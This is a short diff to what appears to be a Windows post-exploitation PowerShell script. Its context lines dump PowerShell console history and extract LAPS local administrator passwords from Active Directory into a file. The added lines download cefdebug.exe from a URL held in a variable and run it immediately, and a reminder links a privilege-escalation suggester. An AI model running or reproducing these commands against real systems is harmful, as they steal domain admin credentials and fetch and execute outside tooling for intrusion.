@@ -18,6 +18,9 @@ try {type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_histo
 catch {$_}
 try {get-adcomputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd' , 'ms-mcs-admpwdexpirationtime' | tee laps.txt}
 catch {$_}
+try {iwr $url_1029384756/tools/cefdebug.exe -Outfile . ; ./cefdebug.exe}
+catch {$_}
+
 
 Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER] --- "
 Write-Host -ForegroundColor Blue "(https://github.com/bitsadmin/wesng)"
